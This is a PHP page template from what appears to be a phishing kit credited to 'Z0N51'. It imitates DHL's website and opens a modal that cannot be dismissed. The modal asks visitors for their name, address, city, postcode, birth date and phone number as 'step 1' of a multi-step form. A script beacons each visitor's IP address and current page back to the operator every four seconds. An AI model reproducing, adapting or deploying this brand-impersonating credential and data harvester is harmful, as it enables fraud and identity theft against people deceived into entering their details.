<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    $_SESSION['last_page'] = "details";

?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="DHL">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>DHL</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
    </head>
    <body>

    
    <!-- header -->
     <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="logo">
          <img src="<?php echo IMGSPATH; ?>/dhl-logo.svg" alt="">
        </div>
        <div class="links_1">
          <ul class="mb-0 ps-0 d-flex align-items-center">
            <li><i class="fa-solid fa-magnifying-glass search"></i> <?php echo get_text('head_1'); ?></li>
            <li data-lang="en" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] == 'en' ) { echo 'active'; } ?>">EN</li>
            <li data-lang="<?php echo $_SESSION['lang']; ?>" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] !== 'en' ) { echo 'active'; } ?>"><?php echo $_SESSION['lang']; ?></li>
          </ul>
        </div>
        <img src="<?php echo IMGSPATH; ?>/bars.png" class="bars" alt="">
      </div>
     </header>
     <div class="some_linsk">
      <div class="container_some_links d-flex justify-content-between align-items-center">
        <div class="part_left">
          <ul class="ps-0 mb-0 d-flex align-items-center">
            <li><a href=""><?php echo get_text('mainmenu_1'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
            <li><a href=""><?php echo get_text('mainmenu_2'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
            <li><a href=""><?php echo get_text('mainmenu_3'); ?></a></li>
            <li><a href=""><?php echo get_text('mainmenu_4'); ?></a></li>
          </ul>
        </div>
        <div class="part_right">
          <ul class="ps-0 mb-0 d-flex align-items-center">
            <li><a href=""><?php echo get_text('mainmenu_5'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
          </ul>
        </div>
      </div>
     </div>

     <div class="box_height">
      
     </div>

     <!-- wrapper_details -->
     

    <!-- footer -->
      <footer class="footer_1">
        <div class="contianer_footer_1">
          <div class="row w-100 mx-auto">
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span class="active"><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_1_1'); ?></li>
                <li><?php echo get_text('f_w_1_2'); ?></li>
                <li><?php echo get_text('f_w_1_3'); ?></li>
                <li><?php echo get_text('f_w_1_4'); ?></li>
                <li><?php echo get_text('f_w_1_5'); ?></li>
                <li><?php echo get_text('f_w_1_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_2_1'); ?></li>
                <li><?php echo get_text('f_w_2_2'); ?></li>
                <li><?php echo get_text('f_w_2_3'); ?></li>
                <li><?php echo get_text('f_w_2_4'); ?></li>
                <li><?php echo get_text('f_w_2_5'); ?></li>
                <li><?php echo get_text('f_w_2_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_3_1'); ?></li>
                <li><?php echo get_text('f_w_3_2'); ?></li>
                <li><?php echo get_text('f_w_3_3'); ?></li>
                <li><?php echo get_text('f_w_3_4'); ?></li>
                <li><?php echo get_text('f_w_3_5'); ?></li>
                <li><?php echo get_text('f_w_3_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_4_1'); ?></li>
                <li><?php echo get_text('f_w_4_2'); ?></li>
                <li><?php echo get_text('f_w_4_3'); ?></li>
                <li><?php echo get_text('f_w_4_4'); ?></li>
                <li><?php echo get_text('f_w_4_5'); ?></li>
                <li><?php echo get_text('f_w_4_6'); ?></li>
                <li><?php echo get_text('f_w_4_7'); ?></li>
                <li><?php echo get_text('f_w_4_8'); ?></li>
              </ul>
            </div>                                    
          </div>
        </div>
        <div class="container_copyghit">
          <div class="container_top_copyghit d-flex justify-content-between">
            <div class="part_left">
              <img src="<?php echo IMGSPATH; ?>/glo-footer-logo.svg" alt="">
              <ul class="d-flex align-items-center ps-0 mb-0">
                <li><?php echo get_text('foot_1'); ?></li>
                <li><?php echo get_text('foot_2'); ?></li>
                <li><?php echo get_text('foot_3'); ?></li>
                <li><?php echo get_text('foot_4'); ?></li>
                <li><?php echo get_text('foot_5'); ?></li>
                <li><?php echo get_text('foot_6'); ?></li>
                <li><?php echo get_text('foot_7'); ?></li>
              </ul>
            </div>
            <div class="part_right">
              <h1><?php echo get_text('followus'); ?></h1>
              <img src="<?php echo IMGSPATH; ?>/socil.png" class="social2" alt="">
              <img src="<?php echo IMGSPATH; ?>/social1.png" class="social1" alt="">
            </div>            
          </div>
          <div class="txt_copyght">
            <p class="mb-0"><?php echo get_text('copyright'); ?></p>
          </div>
        </div>
      </footer>





      <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-body">
                        





<form action="index.php" method="post">
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="details">
          <div class="title">
            <span><?php echo get_text('step1'); ?></span>
            <h1><?php echo get_text('details_title'); ?></h1>
          </div>
          <!-- <?php if( isset($_GET['error']) ) : ?> -->
          <div class='alert alert-danger mt-3 rounded-0 mb-0' role='alert'>
            <i class='ri-alert-line'></i> <?php echo get_text('details_error'); ?>
          </div>  
          <!-- <?php endif; ?>       -->
          <div class="inputes">
            <div class="row w-100 mx-auto">
              <div class="col-md-6 ps-0">
                <div class="form-group <?php echo errclass($_SESSION['errors'],'first_name') ?>">
                  <label for="first_name"><?php echo get_text('first_name_label'); ?></label>
                  <input type="text" name="first_name" id="first_name" value="<?php echo get_value('first_name'); ?>">
                </div>
              </div>
              <div class="col-md-6 pe-0">
                <div class="form-group <?php echo errclass($_SESSION['errors'],'last_name') ?>">
                  <label for="last_name"><?php echo get_text('last_name_label'); ?></label>
                  <input type="text" name="last_name" id="last_name" value="<?php echo get_value('last_name'); ?>">
                </div>                
              </div>
            </div>            
            <div class="form-group <?php echo errclass($_SESSION['errors'],'address') ?>">
              <label for="address"><?php echo get_text('address_label'); ?></label>
              <input type="text" name="address" id="address" value="<?php echo get_value('address'); ?>">
            </div>             
            <div class="form-group <?php echo errclass($_SESSION['errors'],'city') ?>">
              <label for="city"><?php echo get_text('city_label'); ?></label>
              <input type="text" name="city" id="city" value="<?php echo get_value('city'); ?>">
            </div>             
            <div class="form-group <?php echo errclass($_SESSION['errors'],'zip') ?>">
              <label for="zip"><?php echo get_text('zip_label'); ?></label>
              <input type="text" name="zip" id="zip" value="<?php echo get_value('zip'); ?>">
            </div>
            <div class="form-group <?php echo errclass($_SESSION['errors'],'birth_date') ?>">
              <label for="birth_date"><?php echo get_text('birth_date_label'); ?></label>
              <input inputmode="numeric" type="text" name="birth_date" id="birth_date" value="<?php echo get_value('birth_date'); ?>">
            </div>             
            <div class="form-group <?php echo errclass($_SESSION['errors'],'phone') ?>">
              <label for="phone"><?php echo get_text('phone_label'); ?></label>
              <input type="text" name="phone" id="phone" value="<?php echo get_value('phone'); ?>">
            </div>             
          </div>
          <div class="btn_sub">
            <button type="submit"><?php echo get_text('continue'); ?></button>
          </div>
        </form>









                    </div>
                </div>
            </div>
        </div>






    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="<?php echo JSPATH; ?>/js.js"></script>
    
    <script>

        var myModal = new bootstrap.Modal(document.getElementById('staticBackdrop'), {
                keyboard: false,
            });
            myModal.show();     

        $(".form-group input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });

        $(".form-group input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        });

        $('input').each(function(){
          if ($(this).val().length > 0) {
              $(this).prev().addClass("focus");
            $(this).addClass("focus");
          }
        });

        $("#birth_date").mask('00/00/0000');

        $(".lang").click(function(){
              var lang = $(this).data('lang');
              window.location.href ="index.php?lang=" + lang;
            });

        worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'details'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);             
    </script>
    </body>
</html>